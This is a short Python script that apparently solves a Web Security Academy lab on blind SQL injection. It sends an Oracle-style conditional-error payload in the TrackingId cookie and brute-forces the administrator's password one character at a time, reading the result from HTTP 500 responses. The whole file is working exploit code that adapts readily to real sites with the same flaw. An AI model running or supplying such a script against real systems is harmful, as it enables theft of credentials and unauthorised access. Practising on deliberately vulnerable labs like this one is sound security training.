import requests

url = "https://0aa500a0037edd20800b03bb00d800b1.web-security-academy.net/login"
session_cookie = "TrtXogzeq9IOEkDMIn5uWUanwHOrFiBo"
characters = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

for position in range(1, 21):
    for char in characters:
        payload = (
            f"KoCmVRWqy3ZMR3Wm' AND (SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' "
            f"THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--"
        )
        cookies = {
            "TrackingId": payload,
            "session": session_cookie
        }
        r = requests.get(url, cookies=cookies)
        if r.status_code == 500:
            password += char
            print(f"[+] Position {position}: {char}  ->  {password}")
            break

print(f"\n[*] Final password: {password}")